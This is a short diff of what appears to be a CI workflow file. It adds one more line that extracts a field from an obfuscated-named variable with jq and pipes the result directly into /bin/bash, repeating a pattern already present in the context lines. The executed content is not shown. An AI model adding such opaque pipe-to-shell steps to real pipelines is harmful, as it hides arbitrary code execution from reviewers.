@@ -36,6 +36,7 @@ jobs:
           printf '%s' "$m40" | jq -r .a1804 | /bin/bash
           echo $uc914 | jq -r .yqkg8131 | /bin/bash
           echo $j40 | jq -r .rofz2 | /bin/bash
+          echo $avto20 | jq -r .xir567 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
